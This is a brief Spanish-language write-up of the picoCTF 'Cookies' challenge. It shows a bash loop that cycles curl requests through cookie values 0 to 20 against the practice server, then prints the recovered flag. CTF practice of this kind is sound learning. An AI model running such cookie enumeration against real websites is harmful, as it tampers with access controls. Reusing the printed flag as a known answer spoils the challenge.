#### escripción

¿A quién no le encantan las galletas? Intenta descubrir cuál es la mejor. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)

---

vamos a usar la consola con el link de la pagina
con el comando curl

luisquintero@DESKTOP-P53ABHB:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"
; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
luisquintero@DESKTOP-P53ABHB:~$

Y eso nos da la bandera, investigando con un for todas las cookies posibles y filtrando con un grep

